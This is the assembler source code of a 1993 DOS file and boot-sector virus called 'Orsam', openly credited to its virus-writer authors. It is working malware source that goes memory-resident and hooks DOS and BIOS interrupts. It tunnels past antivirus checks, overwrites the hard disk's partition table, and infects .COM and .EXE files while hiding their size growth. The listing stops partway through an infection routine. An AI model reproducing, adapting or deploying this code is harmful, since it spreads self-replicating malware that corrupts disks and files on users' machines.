﻿




;    This is the assembler source code for my second virus called:   Orsam


;       		      Credits as follows:
;            Virus source code written by:  Prototype and roy g biv
;       		      stubs by: roy g biv



;       	    Copyright (C) 1993 by Defjam Enterprises

;       		Greetings to The Gingerbread Man
;

;       		  Contact the Gingerbread Man:
;       		 P.O. Box 457, Bexley, NSW 2207
;       			   AUSTRALIA




;       		      COMMENTS AT COLUMN 81

;       			  DECLARATIONS

code_byte_c     equ offset code_end-begin       				;true code size
stack_byte_c    equ code_byte_c+80h     					;code size plus 128-byte stack
total_byte_c    equ total_end   						;resident code size
kilo_count      equ (total_byte_c+3ffh)/400h    				;resident code size in kilobytes
sec_count       equ (code_byte_c+1ffh)/200h     				;true code size in sectors
com_byte_c      equ 0ffffh-stack_byte_c 					;largest infectable .COM file size
resp_count      equ kilo_count*40h      					;resident code size in paragraphs

int12h_flag     equ 1   							;toggle value when hooked
int21h_flag     equ 2   							;toggle value when executing
val04h_flag     equ 4   	;unused
val08h_flag     equ 8   	;unused
val10h_flag     equ 10h 	;unused
val20h_flag     equ 20h 	;unused
suffix_flag     equ 40h 	;this cannot be altered!			;suffix of file to infect is neither .COM, nor .EXE
closef_flag     equ 80h 	;this value was used for convenience only       ;suffix of file to close is neither .COM, nor .EXE

; there you go - four free bits from a toggle switch to use at your discretion


;       			      CODE

.model  tiny
.186
.code

org     100h

stub_com	equ 0   	;if 1, use .COM format as initial stub
stub_exe	equ 0   	;if 1, use .EXE format as initial stub

stub:

if      stub_com
	db      0e9h
	dw      0
else
  if      stub_exe
	db      "MZ"
	dw      (offset code_end-offset stub) and 1ffh
	dw      (offset code_end-offset stub+1ffh)/200h
	dw      0
	dw      2
	dw      0
	dw      0ffffh
	dw      0fff0h
	dw      total_byte_c+100h
	db      "GM"
	dw      offset begin-offset host+100h
	dw      0fff0h
	db      "<defjam>"

host:   int     20h
	db      0
  endif
endif

begin:  call    file_load       						;save initial offset on stack

file_load:
	pop     si      							;locate file entry point
	sub     si,offset file_load-begin       				;point to "begin"
	mov     ax,1d7h 							;call sign
	int     13h     							;check if resident
	cmp     ax,4d47h							;return sign if resident
	jnz     go_resident     						;branch if not resident

jump_end:        
	jmp     file_end							;branch to termination routine
	db      "Orsam - Made in OZ"    					;patriotism at its best!

go_resident:
	mov     ax,es   							;save PSP segment
	dec     ax      							;point to MCB segment
	mov     ds,ax   							;save MCB segment in ES
	push    ds      							;save MCB segment on stack
	mov     ax,resp_count   						;number of paragraphs while resident
	mov     di,12h  							;point to offset of system memory value
	sub     word ptr ds:[di-0fh],ax 					;reduce top of free memory
	sub     word ptr ds:[di],ax     					;reduce top of system memory
	mov     es,word ptr ds:[di]     					;save new top of system memory in ES
	push    cs      							;save code segment on stack
	push    si      							;save low memory offset on stack
	mov     cx,(code_byte_c+1)/2    					;number of words in code
	xor     di,di   							;set destination offset to 0
	cld     								;set index direction to forward
	db      2eh     							;CS: to avoid having to alter DS
	repz    movsw   							;move code to top of system memory
	push    es      							;save high memory code segment on stack
	push    offset fhook_interrupts-begin   				;save high memory offset on stack
										;(simulate far call)
										;(say that slowly, so as to not offend)
	retf    								;return to fhook_interrupts at top of free memory

fhook_interrupts:
	mov     ah,52h
	int     21h     							;retrieve DOS List of Lists segment
										;(equivalent to code segment of MSDOS.SYS (or equivalent))
	mov     word ptr cs:[offset system_seg-begin-2],es      		;save code segment of system file
	mov     word ptr cs:[process_no],cx     				;specify host is the only program currently executing
	mov     ds,cx   							;set DS to 0
	inc     cx      							;set toggle switches
	mov     word ptr cs:[toggle_byte],cx    				;interrupt 21h not executing,
										;interrupt 12h already hooked
										;(incidently zeroes handle number)
;       		     After DOS has loaded,
;       	  reducing the value returned by interrupt 12h
;       	   will NOT reduce the available free memory!
;   Therefore, code stored here will be overwritten when COMMAND.COM reloads

	push    cs      							;save code segment on stack
	pop     es      							;restore code segment from stack
	mov     si,4    							;offset of interrupt 1 in interrupt table
	movsw   								;save old offset
	movsw   								;save old code segment
	mov     bp,offset new_1-begin   					;point to new interrupt 1 handler
	mov     word ptr ds:[si-4],bp   					;overwrite old offset with new offset
	mov     word ptr ds:[si-2],cs   					;overwrite old code segment with code segment
	lodsw   								;skip 2 bytes in source
	lodsw   								;skip 2 bytes in source
	push    si      							;save low offset of interrupt 3 handler
	movsw   								;save old offset
	push    si      							;save high offset of interrupt 3 handler on stack
	movsw   								;save old code segment
										;(save interrupt 3)
	les     bx,dword ptr ds:[si+74h]					;retrieve code segment and offset of interrupt 21h
	mov     ah,2ch  							;retrieve system time
										;(dummy call to invoke interrupt 21h)
	pushf   								;save flags on stack
	push    cs      							;save code segment on stack
	push    offset hook21h_cont-begin       				;save offset on stack
										;(simulate interrupt call)
call_int1:
	push    100h    							;equivalent to save flags (but with T flag set) on stack
	push    es      							;save interrupt handler code segment on stack
	push    bx      							;save interrupt handler offset on stack
										;(simulate interrupt call)
new_1:  push    es      							;save ES on stack
	push    0       							;save 0 on stack
	pop     es      							;set ES to 0
	pusha   								;save all registers on stack
	mov     bp,sp   							;point to current top of stack
	mov     si,old01_addr   						;offset of address of old interrupt 1 handler
	mov     di,4    							;offset of interrupt 1 in interrupt table
	cmp     word ptr ss:[bp+14h],4d47h      				;check code segment of interrupt
										;(the value here is altered as required)
system_seg:
	ja      quit_1  							;branch while not segment of system file
	cld     								;set index direction to forward
	db      2eh     							;CS:
	movsw   								;restore old offset
	db      2eh     							;CS:
	movsw   								;restore old code segment
										;(restore interrupt 1)
	lea     si,word ptr [bp+12h]    					;point to offset of interrupt 13h handler
	scasw   								;skip 2 bytes in destination
	scasw   								;skip 2 bytes in destination
	db      36h     							;SS:
	movsw   								;store new offset
	db      36h     							;SS:
	movsw   								;store new code segment
										;(remap interrupt 3)
quit_1: popa    								;restore all registers from stack
	pop     es      							;restore ES from stack
	iret    								;return from interrupt

hook21h_cont:
	pop     si      							;restore high offset of interrupt 3 handler from stack
	push    offset hook1_cont-begin 					;save offset on stack
										;(simulate subroutine call)
hook_int:
	push    0       							;save 0 on stack
	pop     ds      							;set DS to 0
	push    cs      							;save code segment on stack
	pop     es      							;restore code segment from stack
	mov     di,offset jfar_21h-begin+3      				;offset of area to store old interrupt 21h handdler address
	std     								;set index direction to backward
	push    word ptr ds:[si]						;save interrupt code segment on stack
	movsw   								;save interrupt code segment in code
	push    word ptr ds:[si]						;save interrupt offset on stack
	movsw   								;save interrupt offset in code
	push    offset hook_cont-begin  					;save offset on stack
										;(simulate subroutine call)
hook_interrupt:
	push    ds      							;save DS on stack
	push    es      							;save ES on stack
	pusha   								;save all registers on stack
	mov     bp,sp   							;point to current top of stack
	lds     si,dword ptr ss:[bp+16h]					;retrieve code segment and offset of interrupt to hook
	push    cs      							;save code segment on stack
	pop     es      							;restore code segment of storage area from stack
	mov     di,old21h_code  						;offset of storage area
	cld     								;set index direction to forward
	movsb   								;move 1 byte of handler into storage
	movsw   								;move 2 bytes of handler into storage
	movsw   								;move 2 bytes of handler into storage
	push    ds      							;save interrupt code segment on stack
	pop     es      							;restore interrupt code segment from stack
	mov     al,0eah 							;set far direct call (JMP xxxx:xxxx)
	lea     di,word ptr [si-5]      					;point to offset of interrupt to hook
	cli     								;disable interrupts
	stosb   								;store call in handler
	mov     ax,offset intro_21h-begin       				;offset of new interrupt 21h handler
	stosw   								;store offset in handler
	mov     ax,cs   							;code segment of new interrupt 21h handler
	stosw   								;store code segment in handler
										;(stealth-hook interrupt)
	sti     								;enable interrupts
	popa    								;restore all registers from stack
	pop     es      							;restore ES from stack
	pop     ds      							;restore DS from stack
	ret     4       							;return from subroutine and discard 4 bytes from stack

hook_cont:
	push    si      							;save SI on stack
	mov     si,0bch 							;offset of interrupt 2fh in interrupt table
	mov     di,offset jfar_2fh-begin+1      				;offset of area to store old interrupt 2fh handler
	movsw   								;save interrupt code segment in code
	movsw   								;save interrupt offset in code
	mov     word ptr ds:[si-4],offset new_2fh-begin 			;overwrite old offset with new offset
	mov     word ptr ds:[si-2],cs   					;overwrite old code segment with code segment
	pop     si      							;restore SI from stack

known_ret:
	ret     								;return from subroutine

hook1_cont:
	mov     word ptr ds:[si-6],bp   					;overwrite old offset with new offset
	mov     word ptr ds:[si-4],cs   					;overwrite old code segment with new code segment
										;(rehook interrupt 1 - it's already been saved)
	push    ds      							;save 0 on stack
	push    cs      							;save code segment on stack
	pop     ds      							;restore code segment from stack
	mov     word ptr ds:[offset system_seg-begin-2],0f000h  		;segment of ROM BIOS which controls the disk drives
	xor     byte ptr ds:[offset system_seg-begin],2 			;change operation from JA to JNZ
	mov     dx,offset new_13h-begin 					;address of new interrupt 13h handler
	push    cs      							;save code segment on stack
	pop     es      							;restore code segment from stack
	mov     bx,dx   							;address of new interrupt 13h handler
	mov     ah,13h
	int     2fh     							;set disk interrupt handler
										;the return value should be pointing to
										;the ROM BIOS, but I'll trace it anyway
	mov     di,offset jfar_13h-begin+1      				;offset of area to store old interrupt 13h handler address
	mov     word ptr cs:[di],bx     					;save old offset
	mov     word ptr cs:[di+2],es   					;save old code segment
	mov     ah,1    							;retrieve system status
										;(dummy call to invoke interrupt 13h)
	pushf   								;save flags on stack
	push    cs      							;save code segment on stack
	call    call_int1       						;save offset on stack
										;(simulate interrupt call)
	xor     byte ptr cs:[offset system_seg-begin],2 			;change operation from JNZ to JA
	pop     ds      							;set DS to 0
	push    ds      							;save DS on stack
	popf    								;clear trace flag

;          if the trace flag is not cleared before returning to DOS,
;              severe system performance degradation will result
;       	      when executing compressed programs

	push    cs      							;save code segment on stack
	pop     es      							;restore code segment from stack
	pop     si      							;restore low offset of interrupt 3 handler
	cld     								;set index direction to forward
	movsw   								;save old offset
	lodsw   								;retrieve old code segment
	stosw   								;save old code segment
	xchg    bp,ax   							;save AX in BP
	pop     bx      							;restore low memory offset from stack
	pop     es      							;restore low memory code segment from stack
	mov     ax,201h 							;read 1 sector
	mov     cx,1    							;cylinder 0, sector 1
	mov     dx,80h  							;side 0 of hard disk
	int     3       							;read partition table
										;(interrupt 13h remapped to interrupt 3)
	push    es      							;save low memory code segment on stack
	pop     ds      							;restore low memory code segment from stack
	mov     cl,4    							;only 4 possible partitions
	mov     di,1beh 							;offset of first partition

find_hdd:
	test    byte ptr ds:[bx+di],dl  					;look for bootable partition
	jz      no_part 							;branch if active partition not found yet
	push    cs      							;save code segment on stack
	pop     es      							;restore code segment from stack
	mov     cl,offset phook_interrupts-newp_loader  			;number of bytes in new partition table loader
	push    cx      							;save byte count of new partition loader on stack
	mov     si,bx   							;point to offset of partition table
	xchg    di,ax   							;save offset of active partition information
	mov     di,offset oldp_loader-begin     				;offset of area to contain original loader
	repz    movsb   							;save original partition table loader
	stosw   								;store offset of active partition
	mov     cl,10h  							;number of bytes in active partition
	xchg    si,ax   							;save offset of original active partition
	add     si,bx   							;allow for the code offset
	push    cx      							;save count of bytes in active partition on stack
	push    si      							;save offset of active partition on stack
	repz    movsb   							;save original active partition
	push    ds      							;save low memory code segment on stack
	pop     es      							;restore low memory code segment from stack
	mov     si,di   							;save offset of original active partition
	pop     di      							;restore offset of active partition from stack
	pop     cx      							;restore count of bytes in active partition from stack
	db      2eh     							;CS:
	repz    movsb   							;store new active partition
	pop     cx      							;restore byte count of new partition loader from stack
	mov     di,bx   							;point to offset of partition table
	db      2eh     							;CS:
	repz    movsb   							;store new partition table loader
	cmp     bp,0f000h       						;check BIOS code segment
	jnz     no_part 							;branch if not in ROM

;  if BIOS code segment is not located in ROM, then something else is loaded
;       (antivirus card, software with anti-tunneling techniques, etc.)
;   so partition write must not occur, but partition must be stored in code
;     because interrupt 13h stealth techniques will replace it in memory.

	mov     ax,301h 							;write 1 sector
	inc     cx      							;cylinder 0, sector 1
	int     3       							;write infected partition table
	push    cs      							;save code segment on stack
	pop     es      							;restore code segment from stack
	mov     ax,sec_count+300h       					;number of sectors in code
	xor     bx,bx   							;set address to 0
	inc     cx      							;cylinder 0, sector 2
	int     3       							;write viral code
	dec     cx      							;dummy CX so loop will fall straight through

no_part:add     di,10h  							;point to next partition
	loop    find_hdd							;repeat while possible partitions left
	push    cx      							;save 0 on stack
	pop     es      							;set ES to 0
	mov     si,old03_addr   						;offset of pointer to original interrupt 3 handler
	mov     di,0ch  							;offset of interrupt 3 in interrupt table
	db      2eh     							;CS:
	movsw   								;restore old offset
	db      2eh     							;CS:
	movsw   								;restore old code segment
										;(restore old interrupt 3 handler)
	pop     ds      							;restore PSP segment from stack
	mov     si,1ah  							;offset of termination address in PSP
	les     bx,dword ptr ds:[si]    					;get old termination code segment and offset
	pushf   								;save flags on stack
	push    cs      							;save code segment on stack
	call    set_terminate   						;save offset on stack
										;(simulate interrupt call)
	mov     cx,8    							;number of bytes to scan
	mov     dx,cx   							;offset of filename in MCB
	push    offset end_cont-begin   					;save offset on stack
										;(simluate subroutine call)
test_int12h:
	push    ds      							;save MCB segment on stack
	pop     es      							;restore MCB segment from stack
	test    byte ptr cs:[toggle_byte],int12h_flag   			;check the status of interrupt 12h
	jnz     check_comspec   						;branch if interrupt 12h already hooked
	push    0       							;save 0 on stack
	pop     ds      							;set DS to 0
	mov     word ptr ds:[48h],offset new_12h-begin  			;overwrite old offset with new offset
	mov     word ptr ds:[4ah],cs    					;overwrite old code segment with new code segment
										;(hook interrupt 12h to hide memory change)
;             if interrupt 12h is hooked from the partition table,
;       	  MS-DOS v6.xx EMM386.EXE causes a system hang

	or      byte ptr cs:[toggle_byte],int12h_flag   			;specify that interrupt 12h has been hooked

check_comspec:
	xor     al,al   							;set search byte to 0
	mov     di,dx   							;set DI to offset of pathname
	cld     								;set index direction to forward
	repnz   scasb   							;find terminating zero in pathname
										;(MCB contains filename in DOS v4.00+)
	push    es      							;save MCB segment on stack
	pop     ds      							;restore MCB segment from stack
	push    cs      							;save code segment on stack
	pop     es      							;restore code segment from stack
	mov     cx,offset end_cont-command      				;number of bytes to compare
	lea     si,word ptr [di-2]      					;point to offset of end of filename
	mov     di,offset end_cont-begin-1      				;offset of end of "COMMAND"
	std     								;set index direction to backwards

compare_spec:
	lodsb   								;grab a letter of filename
	and     al,5fh  							;convert to uppercase
	scasb   								;compare with COMSPEC file
	loopz   compare_spec    						;repeat while letters remain
	mov     ah,51h
	call    call_21h							;get PSP segment

int12h_cont:
	mov     ds,bx   							;save PSP segment
	jcxz    comspec_ret     						;branch if COMSPEC file is executing
	add     word ptr ds:[2],resp_count      				;restore top of free memory

comspec_ret:
	ret     								;return from subroutine

command db      "COMMAND"       						;file for which top of memory is not restored
										;(otherwise this code is overwritten when a reload occurs)
end_cont:
	push    ds      							;save PSP segment on stack
	pop     es      							;restore PSP segment from stack
	xor     si,si   							;set initial offset to 0

file_end:
	push    cs      							;save code segment on stack
	pop     ds      							;restore code segment from stack
	cld     								;set index direction to forward
	add     si,offset exe_buffer-begin      				;point to original header of host file
	cmp     word ptr ds:[si],5a4dh  					;check file type
	jz      exec_exe							;branch if .EXE file
	mov     di,100h 							;.COM files always start at 100h
	push    es      							;save PSP segment on stack
	push    di      							;save offset of original .COM code on stack
										;(simulate far call)
	movsb   								;restore 1 original byte of .COM file
	movsw   								;restore 2 original bytes of .COM file
	jmp     short fix_registers     					;branch to restore registers

exec_exe:
	add     si,0eh  							;point to stack segment in header
	mov     di,es   							;save PSP segment
	add     di,10h  							;restore host .EXE file header
	lodsw   								;retrieve stack segment
	add     ax,di   							;relocate for actual memory segment
	xchg    dx,ax   							;save stack segment
	lodsw   								;retrieve stack pointer
	xchg    cx,ax   							;save stack pointer
	lodsw   								;checksum (waste of 2 bytes!)
	lodsw   								;retrieve instruction pointer
	xchg    bx,ax   							;save intruction pointer
	lodsw   								;retrieve code segment
	add     ax,di   							;relocate for actual memory segment
	mov     ss,dx   							;restore original stack segment
	mov     sp,cx   							;restore original stack pointer
	push    ax      							;save code segment of original .EXE code on stack
	push    bx      							;save offset of original .EXE code on stack
										;(simulate far call)
fix_registers:
	push    es      							;save PSP segment on stack
	pop     ds      							;restore PSP segment from stack
	retf    								;return to host file's code

terminate:
	pushf   								;save flags on stack
	sub     word ptr cs:[process_no],4      				;specify current process is terminating
	mov     bx,word ptr cs:[process_no]     				;retrieve process number
	push    word ptr cs:[bx+proc_seg]       				;save code segment of original termination handler
	push    word ptr cs:[bx+proc_off]       				;save offset of original termination handler
	test    byte ptr cs:[toggle_byte],int21h_flag   			;find out what interrupt 21h is doing
	jz      end_int21h      						;branch if interrupt 21h is not executing
										;(for compability with interrupt 20h, et al)
intro_21h:
	pushf   								;save flags on stack
	push    word ptr cs:[offset jfar_21h-begin+3]   			;save old interrupt 21h handler code segment on stack
	push    word ptr cs:[offset jfar_21h-begin+1]   			;save old interrupt 21h handler offset on stack
	xor     byte ptr cs:[toggle_byte],int21h_flag   			;toggle interrupt 21h status
	test    byte ptr cs:[toggle_byte],int21h_flag   			;find out what interrupt 21h is doing
	jnz     exec_int21h     						;branch if interrupt 21h is executing
	call    hook_interrupt  						;hook interrupt
	cmp     ax,4b00h							;remember which operation was requested
	jz      exec_child      						;branch if executing
	popf    								;restore flags from stack

end_int21h:
	retf    2       							;return from interrupt with flags set

exec_child:
	cbw     								;zero AX
	mov     bx,header_buffer						;offset of area to contain parameter block for execution
	mov     ss,word ptr cs:[bx+10h] 					;set new stack segment to stack segment of program
	mov     sp,word ptr cs:[bx+0eh] 					;set new stack pointer to stack pointer of program
										;(what we need is an LSS,SP command in 8086 mode)
	jmp     dword ptr cs:[bx+12h]   					;branch to host code

exec_int21h:
	push    es      							;save ES on stack
	pusha   								;save all registers on stack
	mov     bp,sp   							;point to current top of stack
	mov     si,old21h_code  						;offset of storage area
	les     di,dword ptr ss:[bp+12h]					;retrieve code segment and offset of hooked interrupt
	cld     								;set index direction to forward
	cli     								;disable interrupts
	db      2eh
	movsb   								;restore 1 byte of handler from storage
	db      2eh
	movsw   								;restore 2 bytes of handler from storage
	db      2eh
	movsw   								;restore 2 bytes of handler from storage
	sti     								;enable interrupts
	popa    								;restore all registers from stack
	pop     es      							;restore ES from stack
	add     sp,4    							;restore stack pointer to value before interrupt was restored
	push    cs      							;save code segment on stack
	push    offset intro_21h-begin  					;save offset on stack
										;(simulate interrupt call)
	push    si      							;save SI on stack
	pusha   								;save all registers on stack
	cld     								;set index direction for forward
	mov     cx,(offset call_21h-op_table)/3 				;set length of opcode table
	mov     si,offset op_table-begin-2      				;point to table of opcodes

find_op:inc     si      							;skip low byte of opcode address
	inc     si      							;skip high byte of opcode address

;  using CMPSW here, to save a byte, will result in a system hang, if DI=FFFFh

	db      2eh     							;CS:
	lodsb   								;get opcode from table
	cmp     ah,al   							;check opcode
	loopnz  find_op 							;branch if opcode not handled but opcodes remain
	push    word ptr cs:[si]						;save opcode address on stack
	mov     bp,sp   							;point to current top of stack
	pop     word ptr ss:[bp+12h]    					;restore opcode address from stack
										;save opcode address in hole on stack
										;(simulate subroutine call)
	popa    								;restore all registers from stack
	ret     								;return from subroutine
	db      "You can't catch the Gingerbread Man!!" 			;yeah!

op_table:
	db      11h     							;find first (FCB)
	dw      offset hide_length-begin
	db      12h     							;find next (FCB)
	dw      offset hide_length-begin
	db      3ch     							;create file
	dw      offset do_extend-begin
	db      3dh     							;open file
	dw      offset do_infect-begin
	db      3eh     							;close file
	dw      offset do_close-begin
	db      3fh     							;read file
	dw      offset do_disinf-begin
	db      40h     							;write file
	dw      offset do_disinf-begin
	db      42h     							;set file pointer
	dw      offset check_disinf-begin
	db      4bh     							;load file
	dw      offset check_infect-begin
	db      57h     							;get/set file date and time
	dw      offset fix_time-begin
	db      5bh     							;create file
	dw      offset do_extend-begin
	db      6ch     							;extended open/create (DOS v4.00+)
	dw      offset check_extend-begin

default_handler:
	db      0       		;this must not be removed       	;corresponds to anything
	dw      offset jfar_21h-begin   ;this must not be removed

;       	   adding new opcode handlers is very simple -
;        simply insert the value of the opcode to intercept (AH only!),
;          and the address of the handler, ABOVE the default handler

call_21h:
	pushf   								;save flags on stack
	push    cs      							;save code segment on stack
	push    offset known_ret-begin  					;save offset of a known RET on stack
										;(simulate interrupt call)
jfar_21h:
	db      0eah    							;far jump to original interrupt 21h handler
	dd      0

hide_length:
	call    call_21h							;find file
	or      al,al   							;check return code
	jnz     qthide  							;branch if error occurred
	push    es      							;save ES on stack
	push    ax      							;save AX on stack
	push    bx      							;save BX on stack
	mov     ah,51h
	call    call_21h							;retrieve PSP segment
	mov     es,bx   							;save PSP segment
	cmp     bx,word ptr es:[16h]    					;check segment of parent PSP
	jnz     nohide  							;branch if current PSP differs from parent PSP
										;(this cures CHKDSK errors!)
	mov     bx,dx   							;save offset of FCB
	cmp     byte ptr ds:[bx],0ffh   					;check FCB type
	pushf   								;save result on stack
	mov     ah,2fh
	call    call_21h							;retrieve DTA address
	popf    								;restore result from stack
	jnz     getime  							;branch if not extended FCB
	add     bx,7    							;allow for additional bytes

getime: mov     al,byte ptr es:[bx+17h] 					;retrieve time
	and     al,1fh  							;convert time to seconds only
	xor     al,1eh  							;check for 60 seconds
	jnz     nohide  							;branch if file is not infected
	and     byte ptr es:[bx+17h],0e0h       				;set 0 seconds
	inc     byte ptr es:[bx+17h]    					;prevent 12:00am times disappearing
	sub     word ptr es:[bx+1dh],code_byte_c				;hide low file length increase
	sbb     word ptr es:[bx+1fh],0  					;hide high file length increase

nohide: pop     bx      							;restore BX from stack
	pop     ax      							;restore AX from stack
	pop     es      							;restore ES from stack

qthide: iret    								;return from interrupt

check_extend:
	or      al,al   							;check requested operation
	jnz     jfar_21h							;branch if not extended open/create

do_extend:
	mov     byte ptr cs:[file_handle],0     				;specify file is not to be infected
	push    bx      							;save BX on stack
	push    dx      							;save DX on stack
	cmp     ax,6c00h							;check which operation was requested
	jnz     create_file     						;branch if operation is not extended open/create
	or      bl,2    							;enable read and write mode
	and     bl,0feh 							;remove write-only bit
	mov     dx,si   							;point to offset of pathname

create_file:
	push    es      							;save ES on stack
	pusha   								;save all registers on stack
	push    ds      							;save segment of pathname on stack
	pop     es      							;restore segment of pathname from stack
	push    offset create_cont-begin					;save offset on stack
										;(simulate subroutine call)
get_suffix:
	xor     al,al   							;set search byte to 0
	mov     cx,7fh  							;maximum number of bytes to search
	mov     di,dx   							;save offset of pathname
	cld     								;set index direction to forward
	repnz   scasb   							;find terminating zero in file's pathname
	dec     di      							;point to terminating zero in pathname
	push    di      							;save offset of end of pathname on stack
	sub     di,dx   							;calculate length of path
	cmp     di,5    							;ensure that file has suffix
										;(prevents infection of data files and such things)
	pop     di      							;restore offset of end of pathname from stack
	jb      return_suffix   						;branch if file has no suffix
	mov     cl,2    							;number of words to compare
	lea     si,word ptr [di-4]      					;point to start of suffix

get_type:
	db      26h     							;ES:
	lodsw   								;retrieve file's suffix
	and     ax,5f5fh							;convert bytes to uppercase
	xchg    bx,ax   							;save letters
	loop    get_type							;repeat while letters remain
	cmp     ax,430eh							;check first half of suffix
	jnz     maybe_exe       						;branch if suffix does not contain 'C.'
	cmp     bx,4d4fh							;check if second half of suffix contains 'MO'
	jmp     short return_suffix     					;branch to save suffix type

maybe_exe:
	cmp     ax,450eh							;check first half of suffix
	jnz     return_suffix   						;branch if suffix does not contain 'O.'
	cmp     bx,4558h							;check if second half of suffix contains 'EX'

return_suffix:
	lahf    								;store result in AH
	and     ah,suffix_flag  						;strip off all but result flag
	or      byte ptr cs:[toggle_byte],suffix_flag   			;store suffix type in toggle
	xor     byte ptr cs:[toggle_byte],ah    				;update suffix type in toggle
	ret     								;return from subroutine

create_cont:
	mov     al,byte ptr cs:[toggle_byte]    				;get suffix type
	and     al,suffix_flag  						;strip off all but suffix flag
	shl     al,1    							;convert to flag for close
	or      byte ptr cs:[toggle_byte],closef_flag   			;store close flag in toggle
	xor     byte ptr cs:[toggle_byte],al    				;update close flag in toggle
	popa    								;restore all registers from stack
	pop     es      							;restore ES from stack
	pop     dx      							;restore DX from stack
	push    ax      							;save AX on stack
	call    call_21h							;create file
	jb      extend_ret      						;branch if error
	xchg    bx,ax   							;save file handle
	push    cx      							;save CX on stack
	push    dx      							;save DX on stack
	push    offset extend_cont      					;save offset on stack
										;(simulate subroutine call)
check_seconds:
	mov     ax,5700h
	call    call_21h							;retrieve file date and time
	mov     ax,cx   							;save seconds
	or      cl,1fh  							;set entire seconds field
	dec     cx      							;set 60 seconds
	xor     al,cl   							;check for 60 seconds
	ret     								;return from subroutine

extend_cont:
	pop     dx      							;restore DX from stack
	pop     cx      							;restore CX from stack
	xchg    bx,ax   							;save handle number
	jz      extend_ret      						;branch if file is already infected
	mov     byte ptr cs:[file_handle],al    				;specify file is to be infected

extend_ret:
	pop     bx      							;discard 2 bytes from stack
	jb      extend_error    						;branch if error
	pop     bx      							;restore BX from stack
	retf    2       							;return from interrupt with flags set

extend_error:
	xchg    bx,ax   							;move operation into AX
	pop     bx      							;restore BX from stack

no_infect:
	jmp     jfar_21h							;branch to old interrupt 21h handler

check_infect:
	cmp     al,1    							;load only...
	jz      debug_load
	cmp     al,2    							;"reserved"
	jz      no_infect
	cmp     al,3    							;load overlay...
	ja      no_infect

	pusha   			;windows
	mov     ax,160ah		;executing
	int     2fh     		;test.
	or      ax,ax   		;(hopefully)
	popa    			;only
	jz      no_infect       	;temporary.

	call    check_environ   						;infect file
	push    es      							;save ES on stack
	push    bx      							;save BX on stack
	push    ds      							;save DS on stack
	push    cx      							;save CX on stack
	push    si      							;save SI on stack
	push    di      							;save DI on stack
	push    es      							;save segment of parameter list on stack
	pop     ds      							;restore segment of parameter list from stack
	push    cs      							;save code segment on stack
	pop     es      							;restore code segment from stack
	inc     ax      							;set operation to load without executing
	mov     cx,0eh  							;number of bytes in parameter block
	mov     si,bx   							;point to offset of parameter block
	mov     bx,header_buffer						;offset of area to store parameter block
	mov     di,bx   							;point to offset of area to store parameter block
	cld     								;set index direction to forward
	repz    movsb   							;move exec parameter block to top of system memory
	pop     di      							;restore DI from stack
	pop     si      							;restore SI from stack
	pop     cx      							;restore CX from stack
	pop     ds      							;restore DS from stack
	pushf   								;save flags on stack
	push    cs      							;save code segment on stack
	push    offset spawn_cont-begin 					;save offset on stack
										;(simulate interrupt call)
debug_load:
	push    bx      							;save BX on stack
	push    dx      							;save DX on stack
	call    call_21h							;load file
	mov     word ptr cs:[header_buffer],ax  				;save return code
	pop     dx      							;restore DX from stack
	pop     bx      							;restore DX from stack
	jb      bad_debug       						;branch if error
	push    es      							;save ES on stack
	push    ds      							;save DS on stack
	pusha   								;save all registers on stack
	push    bx      							;save BX on stack
	mov     ax,3d00h
	call    call_21h							;open file for read only
	xchg    bx,ax   							;move handle number into BX
	call    check_seconds   						;check if file already infected
	pushf   								;save flags on stack
	mov     ah,3eh
	call    call_21h							;close file
	popf    								;retrieve flags from stack
	pop     bx      							;restore BX from stack
	jnz     okay_debug      						;branch if file is not infected
	cld     								;set index direction to forward
	lds     di,dword ptr es:[bx+12h]					;retrieve child code segment and instruction pointer
	lea     si,word ptr [di+offset exe_buffer-begin+3]      		;point to original header of host file
	cmp     byte ptr ds:[di],0e9h   					;check file type
	jnz     debug_exe       						;branch if .EXE file
	add     si,word ptr ds:[di+1]   					;point to original header of host file
	push    ds      							;save initial code segment on stack
	pop     es      							;restore initial code segment from stack
	movsb   								;restore 1 original byte of .COM file
	movsw   								;restore 2 original bytes of .COM file
	sub     si,offset exe_buffer-begin+3    				;point to start of viral code
	push    si      							;save SI on stack
	jmp     short clear_area						;branch to clear memory of code

debug_exe:
	add     si,0bh  							;point to original file header
	lea     di,word ptr [bx+0eh]    					;point to offset of end of original parameter block
	mov     ah,51h
	call    call_21h							;retrieve PSP segment
	add     bx,10h  							;restore host .EXE file header
	lodsw   								;retrieve stack segment
	add     ax,bx   							;relocate for actual memory segment
	mov     word ptr es:[di+2],ax   					;save stack segment in parameter block
	movsw   								;save stack poiner in parameter block
	cmpsw   								;checksum (waste of 2 bytes!)
	push    word ptr es:[di]						;save instruction pointer on stack
	movsw   								;store instruction pointer in parameter block
	lodsw   								;retrieve code segment
	add     ax,bx   							;relocate for actual memory segment
	stosw   								;store code segment in parameter block
	push    ds      							;save DS on stack
	pop     es      							;restore ES from stack

clear_area:
	xor     al,al   							;set store byte to 0
	mov     cx,code_byte_c  						;number of bytes to clear
	pop     di      							;restore DI from stack
	repz    stosb   							;clear viral code from low memory

okay_debug:
	popa    								;restore all registers from stack
	pop     ds      							;restore DS from stack
	push    ds      							;save DS on stack
	pusha   								;save all registers on stack
	mov     cx,7fh  							;number of bytes to search for filename
	call    test_int12h     						;check if interrupt 12h already hooked
	popa    								;restore all registers from stack
	mov     dx,ds   							;save DS in DX
	pop     ds      							;restore DS from stack
	pop     es      							;restore ES from stack
	cld     								;set index direction to forward

bad_debug:
	mov     ax,word ptr cs:[header_buffer]  				;retrieve return code
	retf    2       							;return from interrupt with flags set

spawn_cont:
	pop     bx      							;restore BX from stack
	pop     es      							;restore ES from stack
	jb      bad_debug       						;branch if error
	mov     si,0ah  							;offset of termination address in PSP
	mov     bp,sp   							;point to current top of stack
	mov     ds,dx   							;restore DS from DX
	les     bx,dword ptr ss:[bp+6]  					;get old termination code segment and offset

set_terminate:
	mov     di,word ptr cs:[process_no]     				;retrieve process number
	add     word ptr cs:[process_no],4      				;specify new process is spawning
	mov     word ptr cs:[di+proc_off],bx    				;save old offset
	mov     word ptr cs:[di+proc_seg],es    				;save old code segment
	mov     word ptr ds:[si],offset terminate-begin 			;overwrite old offset with new offset
	mov     word ptr ds:[si+2],cs   					;overwrite old code segment with new code segment
	push    ds      							;save DS on stack
	pop     es      							;restore ES from stack
	mov     ax,4b00h							;set operation to execute
	iret    								;return from interrupt

do_infect:
	push    offset jfar_21h-begin   					;save return address on stack
										;(simulate subroutine call)
check_environ:
	push    ds      							;save DS on stack
	push    es      							;save ES on stack
	pusha   								;save all registers on stack
